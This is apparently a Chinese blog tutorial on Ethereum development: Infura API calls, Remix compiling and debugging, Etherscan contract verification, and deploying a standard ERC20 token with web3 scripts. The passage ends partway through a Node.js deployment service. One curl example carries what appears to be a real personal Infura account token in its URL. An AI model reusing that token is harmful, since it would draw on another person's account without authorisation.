
![](pic/blockchain/get_eventlog.png)

#### infura 开放 API

> Infura provide secure, reliable, and scalable access to Ethereum APIs and IPFS gateways.

在 infura 注册个人账户，创建项目即可分配访问 API 相关的身份认证信息以及 Endpoint

![](pic/blockchain/infura.png)

通过 [https://infura.io/docs](https://infura.io/docs) 查看 API 文档。例如，获取测试网、主网区块高度

```bash
root@iZwz978rorvlg75nct99l1Z:~# curl https://api.infura.io/v1/jsonrpc/ropsten/eth_blockNumber
{"jsonrpc":"2.0","id":0,"result":"0x42e4f3"}
root@iZwz978rorvlg75nct99l1Z:~# curl https://api.infura.io/v1/jsonrpc/mainnet/eth_blockNumber
{"jsonrpc":"2.0","id":0,"result":"0x65a34e"}
```

发送 API 请求时可以携带账户中的 Token，结合统计面板查看 API 调用情况，如下所示

```bash
root@iZwz978rorvlg75nct99l1Z:~# curl https://api.infura.io/v1/jsonrpc/mainnet/eth_blockNumber?token=9a29276938d14f8e98fc6054ce013ca 
{"jsonrpc":"2.0","id":0,"result":"0x65a365"}
```

![](pic/blockchain/infura_stat.png)

### 以太坊智能合约编译、部署、调试

> 此处合约特指 `Solidity`

#### 编译

- 通过 `solc` 编译
- 通过 `remix-ide` 本地环境编译
- 通过 `remix` 在线环境编译，如 [https://remix.ethereum.org](https://remix.ethereum.org)

#### 部署

- 通过运行以太坊节点 `geth` 控制台部署
- 通过连接以太坊节点 `geth`，以客户端的形式连接节点并运行脚本
- 通过 `remix-ide` 或在线 `remix` 部署

#### 调试

> 此处特指 `remix` 或 `remix-ide` 调试

- `JavaScript VM` 模式

  虚拟机模式，内置 5 个账户，每个账户余额 100 以太坊

![](pic/blockchain/javascript_vm.png)

- `Injected Web3` 模式

  注入模式，先登录 `Metamask`，假设登录的是测试网账户，并且余额为 1.93 以太坊

  ![](pic/blockchain/metamask.png)

![](pic/blockchain/injected_web3.png)

- `Web3 Provider` 模式

  本地运行一个 节点（主网、测试网、私有网、开发者网络均可），remix 连接本地的节点，如，本地运行开发者网络

![](pic/blockchain/web3_provider.png)

### 以太坊区块浏览器与合约

> 此处特指以太坊测试网络区块浏览器 `https://ropsten.etherscan.io`

#### 验证与发布

在以太坊测试网络 `code` 菜单选择 `verify and publish`，提交合约源码并验证

![](pic/blockchain/verify_publish.png)

填写合约名字、编译器版本、是否开启优化选项，然后将合约代码粘贴（如果项目中合约包含多个文件，将多个文件内容整合即可）

![](pic/blockchain/verify_publish2.png)

![](pic/blockchain/verify_publish3.png)

再次回到以太坊测试网查看合约信息，可看到合约已通过验证的提示

![](pic/blockchain/verify_publish4.png)

#### 合约读接口

在 `Read Contract` 菜单可以查看或调用合约读接口

![](pic/blockchain/read_contract.png)

#### 合约写接口

在 `Write Contract` 菜单，借助于 `Metamask` 可以调用合约写接口

![](pic/blockchain/write_contract.png)

根据上述提示 `Connect with Metamask`，连接 `Metamsk`

![](pic/blockchain/write_contract2.png)

连接 `Metamask` 之后，即可调用合约写接口

#### 查看合约相关交易

![](pic/blockchain/get_transaction3.png)

#### 查看合约相关事件

![](pic/blockchain/get_event.png)

### 以太坊智能合约： ERC20 Token

![](pic/blockchain/erc20.png) 

#### 编写合约

##### 接口函数

- `totalSupply()` 函数返回这个 Token 的总发行量;
- `balanceOf()` 查询某个地址的 Token 数量
- `transfer()` owner 使用这个进行发送代币
- `transferFrom ()` Token  的所有者用来发送 Token
- `allowance()` 控制代币的交易，如可交易账号及资产， 控制 Token 的流通
- `approve()` 允许用户可花费的代币数

##### 事件函数

产生事件，从而可以被前端代码捕获到

- event Transfer() Token 的转账事件
- event Approval() 允许事件

> SafeMath 定义了安全的加减乘除操作；ERC20 定义了符合 ERC20 的合约接口；StandardToken 合约继承自 ERC20，是 ERC20 的具体实现，[点击下载](https://dudebing99.github.io/blog/archives/solidity/erc20_token.sol)

```javascript
pragma solidity ^0.4.24;

/**
 * References:
 * https://eips.ethereum.org/EIPS/eip-20
 * https://github.com/ethereum/EIPs/issues/20
 * https://github.com/OpenZeppelin/openzeppelin-solidity
 */

/**
 * @dev Math operations with safety checks
 */
library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
        // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        if (_a == 0) {
            return 0;
        }

        c = _a * _b;
        assert(c / _a == _b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
        // assert(_b > 0); // Solidity automatically throws when dividing by 0
        // uint256 c = _a / _b;
        // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
        return _a / _b;
    }

    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
        assert(_b <= _a);
        return _a - _b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
        c = _a + _b;
        assert(c >= _a);
        return c;
    }
}

/**
 * @dev ERC20 interface
 */
contract ERC20 {
    function totalSupply() public view returns (uint256);
    function balanceOf(address _who) public view returns (uint256);
    function allowance(address _owner, address _spender) public view returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
    function approve(address _spender, uint256 _value) public returns (bool);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Standard Token in ERC20
 */
contract StandardToken is ERC20 {
    using SafeMath for uint256;

    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) balances;
    mapping (address => mapping (address => uint256)) internal allowed;

    /**
     * @dev init token's propertities
     */
    constructor(uint256 _initialSupply, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {
        balances[msg.sender] = _initialSupply;              // Give the creator all initial tokens
        totalSupply = _initialSupply;                       // Update total supply
        name = _tokenName;                                  // Set the name for display purposes
        symbol = _tokenSymbol;                              // Set the symbol for display purposes
        decimals = _decimalUnits;                           // Amount of decimals for display purposes
        owner = msg.sender;                                 // Set the owner
    }

    /**
    * @dev Total number of tokens in existence
    */
    function totalSupply() public view returns (uint256) {
        return totalSupply;
    }

    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the the balance of.
    * @return An uint256 representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    /**
    * @dev Function to check the amount of tokens that an owner allowed to a spender.
    * @param _owner address The address which owns the funds.
    * @param _spender address The address which will spend the funds.
    * @return A uint256 specifying the amount of tokens still available for the spender.
    */
    function allowance(address _owner, address _spender) public view returns (uint256)
    {
        return allowed[_owner][_spender];
    }

    /**
    * @dev Transfer token for a specified address
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    */
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_value <= balances[msg.sender], "balance is unsufficient.");
        require(_to != address(0), "target address is invalid.");

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    /**
    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
    * Beware that changing an allowance with this method brings the risk that someone may use both the old
    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    * @param _spender The address which will spend the funds.
    * @param _value The amount of tokens to be spent.
    */
    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    /**
    * @dev Transfer tokens from one address to another
    * @param _from address The address which you want to send tokens from
    * @param _to address The address which you want to transfer to
    * @param _value uint256 the amount of tokens to be transferred
    */
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool)
    {
        require(_value <= balances[_from], "from's balance is unsufficient.");
        require(_value <= allowed[_from][msg.sender], "value to be transfered is unapproved");
        require(_to != address(0), "to's address is invalid");

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    /**
    * @dev Increase the amount of tokens that an owner allowed to a spender.
    * approve should be called when allowed[_spender] == 0. To increment
    * allowed value is better to use this function to avoid 2 calls (and wait until
    * the first transaction is mined)
    * From MonolithDAO Token.sol
    * @param _spender The address which will spend the funds.
    * @param _addedValue The amount of tokens to increase the allowance by.
    */
    function increaseApproval(address _spender, uint256 _addedValue) public returns (bool)
    {
        allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    /**
    * @dev Decrease the amount of tokens that an owner allowed to a spender.
    * approve should be called when allowed[_spender] == 0. To decrement
    * allowed value is better to use this function to avoid 2 calls (and wait until
    * the first transaction is mined)
    * From MonolithDAO Token.sol
    * @param _spender The address which will spend the funds.
    * @param _subtractedValue The amount of tokens to decrease the allowance by.
    */
    function decreaseApproval(address _spender,uint256 _subtractedValue) public returns (bool)
    {
        uint256 oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue >= oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }
}
```

#### 在线编译

在 `https://remix.ethereum.org` 新建文件 `erc20_token.sol`，粘贴上述代码，点击编译，生成结果如下

![](pic/blockchain/compile_erc20_token.png)

#### 部署合约

点击右侧运行，选择 `Standard Token`

![](pic/blockchain/choose_standard_token.png)

输入合约的构造函数的参数，分别为 `12306，“Kevin's Token", 18, "KT"`，然后点击 `Deploy`

![](pic/blockchain/deploy_standard_token.png)

查看页面下方的控制台，查看详情，找到合约地址 `0xef55bfac4228981e850936aaf042951f7b146e41`

![](pic/blockchain/deploy_standard_token2.png)

#### 执行合约

复制合约地址，点击 `At Address`

![](pic/blockchain/run_standard_token.png)

执行合约的 `totalSupply` 函数

![](pic/blockchain/run_standard_token2.png)

点击控制台，展开交易详情，如下所示

![](pic/blockchain/run_standard_token3.png)

#### 在测试网络部署合约

在 `https://remix.ethereum.org` 编译合约之后，点击 `Detail`，找到 `WEB3DEPLOY`

![](pic/blockchain/standard_token_web3_deploy.png)

![](pic/blockchain/standard_token_web3_deploy2.png)

对 js 略作修改，赋初值，保存脚本为 `erc20.js`

```javascript
let Web3 = require('web3');
let web3;

if (typeof web3 !== 'undefined') {
        web3 = new Web3(web3.currentProvider);
} else {
        // set the provider you want from Web3.providers
        web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
}

var _initialSupply = 12306;
var _tokenName = "Hello World Token";
var _decimalUnits = 18;
var _tokenSymbol = "HWT";
var standardtokenContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_tokenName","type":"string"},{"name":"_decimalUnits","type":"uint8"},{"name":"_tokenSymbol","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]);
var standardtoken = standardtokenContract.new(
   _initialSupply,
   _tokenName,
   _decimalUnits,
   _tokenSymbol,
   {
     from: web3.eth.accounts[0],
     data: '0x60806040523480156200001157600080fd5b50604051620017b7380380620017b78339810180604052810190808051906020019092919080518201929190602001805190602001909291908051820192919050505083600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550836003819055508260009080519060200190620000b792919062000137565b508060019080519060200190620000d092919062000137565b5081600260006101000a81548160ff021916908360ff16021790555033600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050505050620001e6565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200017a57805160ff1916838001178555620001ab565b82800160010185558215620001ab579182015b82811115620001aa5782518255916020019190600101906200018d565b5b509050620001ba9190620001be565b5090565b620001e391905b80821115620001df576000816000905550600101620001c5565b5090565b90565b6115c180620001f66000396000f3006080604052600436106100ba576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100bf578063095ea7b31461014f57806318160ddd146101b457806323b872dd146101df578063313ce56714610264578063661884631461029557806370a08231146102fa5780638da5cb5b1461035157806395d89b41146103a8578063a9059cbb14610438578063d73dd6231461049d578063dd62ed3e14610502575b600080fd5b3480156100cb57600080fd5b506100d4610579565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101145780820151818401526020810190506100f9565b50505050905090810190601f1680156101415780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015b57600080fd5b5061019a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610617565b604051808215151515815260200191505060405180910390f35b3480156101c057600080fd5b506101c9610709565b6040518082815260200191505060405180910390f35b3480156101eb57600080fd5b5061024a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610713565b604051808215151515815260200191505060405180910390f35b34801561027057600080fd5b50610279610c34565b604051808260ff1660ff16815260200191505060405180910390f35b3480156102a157600080fd5b506102e0600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c47565b604051808215151515815260200191505060405180910390f35b34801561030657600080fd5b5061033b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ed9565b6040518082815260200191505060405180910390f35b34801561035d57600080fd5b50610366610f22565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156103b457600080fd5b506103bd610f48565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156103fd5780820151818401526020810190506103e2565b50505050905090810190601f16801561042a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561044457600080fd5b50610483600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610fe6565b604051808215151515815260200191505060405180910390f35b3480156104a957600080fd5b506104e8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506112dd565b604051808215151515815260200191505060405180910390f35b34801561050e57600080fd5b50610563600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506114d9565b6040518082815260200191505060405180910390f35b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561060f5780601f106105e45761010080835404028352916020019161060f565b820191906000526020600020905b8154815290600101906020018083116105f257829003601f168201915b505050505081565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b6000600354905090565b6000600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156107cc576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f66726f6d27732062616c616e636520697320756e73756666696369656e742e0081525060200191505060405180910390fd5b600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156108e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001807f76616c756520746f206265207472616e73666572656420697320756e6170707281526020017f6f7665640000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415151561098b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f746f2773206164647265737320697320696e76616c696400000000000000000081525060200191505060405180910390fd5b6109dd82600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610a7282600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b4482600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b600260009054906101000a900460ff1681565b600080600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508083101515610d59576000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610ded565b610d6c838261156090919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a3600191505092915050565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610fde5780601f10610fb357610100808354040283529160200191610fde565b820191906000526020600020905b815481529060010190602001808311610fc157829003601f168201915b505050505081565b6000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054821115151561109f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f62616c616e636520697320756e73756666696369656e742e000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151515611144576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f746172676574206164647265737320697320696e76616c69642e00000000000081525060200191505060405180910390fd5b61119682600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061122b82600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b600061136e82600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a36001905092915050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600082821115151561156e57fe5b818303905092915050565b6000818301905082811015151561158c57fe5b809050929150505600a165627a7a72305820ea5c3e196330ed8fce5d0bf3d3d885bbfca4b8c4d3658539d798f1be545320b90029',
     gas: '4700000'
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
 })
```

本地运行 geth 节点 `./geth --datadir=./testnet --testnet --cache=2048 --rpc console`，该节点已同步，同时启用了 rpc 服务。

运行部署脚本 `node erc20.js`，得到运行结果如下

> **合约地址：**`0x7f224de3c7276312ac8cca8b822ca2d1579d2197`
>
> **交易 hash：**`0x4884439622697339381cc305a64ba6f11b5dc82cd0b75a1f13545a4a85f0f67c`

```basic
Contract mined! address: 0x7f224de3c7276312ac8cca8b822ca2d1579d2197 transactionHash: 0x4884439622697339381cc305a64ba6f11b5dc82cd0b75a1f13545a4a85f0f67c
```

在 `https://ropsten.etherscan.io` 查询交易信息

![](pic/blockchain/standard_token_contract.png)

点击上图中合约地址链接（或直接根据合约地址查询），查询合约详细信息

![](pic/blockchain/standard_token_contract2.png)

可以点击 `Code`，填写合约名称、编译器版本、是否启用优化，提交合约源码，进行验证，验证同步哦之后，如下所示

![](pic/blockchain/standard_token_verify_contract.png)

在 `Read Contract` 可以对合约进行读操作，如下所示

![](pic/blockchain/standard_token_read_contract.png)

#### 在测试网络一键发币

**前提条件：**

- 本地运行测试网络全节点 `./geth --datadir=./testnet --testnet --cache=2048 --rpc console`，开启 rpc 服务（监听 8545 端口）
- 本地运行代理服务 `node erc20_deploy.js`，监听 12306 端口，支持客户端 `POST` 请求一键发币

代理服务脚本 [点击下载](https://dudebing99.github.io/blog/archives/solidity/erc20_deploy.js)，主要解析请求的代币初始化参数，发布合约成功后，返回合约地址、交易 hash

```javascript
// init http server
var http = require('http');
var url = require('url');

var _initialSupply = 0;
var _tokenName = "";
var _decimalUnits = 18;
var _tokenSymbol = "";

let Web3 = require('web3');
let web3;

if (typeof web3 !== 'undefined') {
	web3 = new Web3(web3.currentProvider);
} else {
	// set the provider you want from Web3.providers
	web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
}

var standardtokenContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_tokenName","type":"string"},{"name":"_decimalUnits","type":"uint8"},{"name":"_tokenSymbol","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]);

